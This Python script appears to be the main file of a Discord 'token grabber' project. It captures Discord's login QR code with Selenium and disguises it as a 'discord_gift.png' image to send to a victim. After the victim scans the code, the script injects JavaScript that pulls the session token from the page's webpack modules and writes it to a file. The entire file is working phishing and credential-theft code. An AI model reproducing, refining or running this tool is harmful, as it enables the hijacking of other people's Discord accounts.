#!/usr/bin/env python3

__author__ = "@hirushaadi"
__version__ = "1.2"
__license__ = "MIT"
__repository__ = "https://github.com/hirusha-adi/Discord-Token-Grabber-by-QR"


import os
import time

from loguru import logger
from PIL import Image
from selenium import webdriver
from selenium.webdriver.common.by import By
import selenium.common.exceptions

from dtg import utitlites


@logger.catch
def logo_qr():
    logger.debug("Pasting the overlay image onto the QR code.")
    im1 = Image.open(os.path.join('image', 'qr_code.png'), 'r')
    im2 = Image.open(os.path.join('image', 'overlay.png'), 'r')
    im2_w, im2_h = im2.size
    im1.paste(im2, (60, 55))
    im1.save(os.path.join('image', 'final_qr.png'), quality=95)
    logger.debug("Overlay image pasted successfully.")


@logger.catch
def paste_template():
    logger.debug("Pasting the QR code onto the template.")
    im1 = Image.open(os.path.join('image', 'template.png'), 'r')
    im2 = Image.open(os.path.join('image', 'final_qr.png'), 'r')
    im1.paste(im2, (120, 409))
    im1.save('discord_gift.png', quality=95)
    logger.debug("File saved to discord_gift.png")


@logger.catch
def get_executable_path():
    executable_path = ""
    if os.name == 'nt':
        current_dir_file = os.path.join(os.getcwd(), "chromedriver.exe")
        sys32_dir_file = "C:\\Windows\\System32\\chromedriver.exe"
        if os.path.isfile(current_dir_file):
            executable_path = current_dir_file
        elif os.path.isfile(sys32_dir_file):
            executable_path = sys32_dir_file
        else:
            executable_path = None
    else:
        current_dir_file = os.path.join(os.getcwd(), "chromedriver")
        usrbin_file = os.path.join("usr", "bin", "chromedriver")
        bin_file = os.path.join("bin", "chromedriver")
        if os.path.isfile(current_dir_file):
            executable_path = current_dir_file
        elif os.path.isfile(usrbin_file):
            executable_path = usrbin_file
        elif os.path.isfile(bin_file):
            executable_path = bin_file
        else:
            executable_path = None
    return executable_path


@logger.catch
def main():
    utitlites.show_logo()
    options = webdriver.ChromeOptions()
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    options.add_experimental_option('detach', True)
    logger.debug("Loaded the options for Chrome webdriver.")

    executable_path = get_executable_path()
    logger.debug(f"Found chromedriver executable_path: {executable_path}")

    if executable_path is None:
        driver = webdriver.Chrome(options=options)
        logger.debug("Initialising Chrome webdriver without passing in the executable_path")
    else:
        driver = webdriver.Chrome(
            options=options,
            executable_path=executable_path
        )
        logger.debug("Initialising Chrome webdriver by passing in the executable_path")

    logger.debug("Chrome webdriver is ready.")

    driver.get('https://discord.com/login')

    while True:
        try:
            image_element = driver.find_element(by=By.XPATH, value=f"//div[@class='qrCodeOverlay_ae8574']") # of type `selenium.webdriver.remote.webelement.WebElement`
            time.sleep(3.5) # wait for image to load, else, results in empty gray space
            original_qr_code_image = image_element.screenshot_as_png # of type `bytes`
            logger.success("Loaded discord login page.")
            break
        except selenium.common.exceptions.NoSuchElementException:
            logger.info("Page is still loading, retrying in 2 seconds...")
            time.sleep(2)


    # ------------------
    # ------------------

    # old (with BeautifulSoup4)
    # ---------
    # page_source = driver.page_source
    # soup = BeautifulSoup(page_source, features='html.parser')
    # div = soup.find('div', class_='qrCodeOverlay_ae8574') # <div class="qrCodeOverlay_ae8574"><img alt="" src="/assets/911cd721660d605c4bf2.png"/></div>
    # qr_code = div.find('img')['src'] # /assets/911cd721660d605c4bf2.png
    # image_element = driver.find_element(by=By.XPATH, value=f"//img[@src='{qr_code}']")

    # new (without BeautifulSoup4)
    # i moved it up, under the while True loop
    # ---------
    # image_element = driver.find_element(by=By.XPATH, value=f"//div[@class='qrCodeOverlay_ae8574']") # of type `selenium.webdriver.remote.webelement.WebElement`
    # original_qr_code_image = image_element.screenshot_as_png # of type `bytes`

    # ------------------
    # ------------------


    file = os.path.join(os.getcwd(), 'image', 'qr_code.png')
    with open(file, "wb") as handler:
        handler.write(original_qr_code_image)
        logger.debug(f"Saved original QR code to: {file}")

    discord_login = driver.current_url
    logo_qr()
    paste_template()

    logger.success('QR Code has been generated > ./discord_gift.png')
    logger.success('Send the QR Code to user and scan. Waiting...')

    while True:
        if discord_login != driver.current_url:
            logger.success("Grabbing token...")
            token = driver.execute_script(r'''
var req = webpackJsonp.push([
    [], {
        extra_id: (e, t, r) => e.exports = r
    },
    [
        ["extra_id"]
    ]
]);
for (let e in req.c)
    if (req.c.hasOwnProperty(e)) {
        let t = req.c[e].exports;
        if (t && t.__esModule && t.default)
            for (let e in t.default) "getToken" === e && (token = t.default.getToken())
    }
return token;   
                ''')
            logger.success(f'Token grabbed: {token}')
            utitlites.save_results_to_file(str(token))
            logger.debug("Saved results to file")
            break

    logger.success('Task complete')


if __name__ == '__main__':
    main()
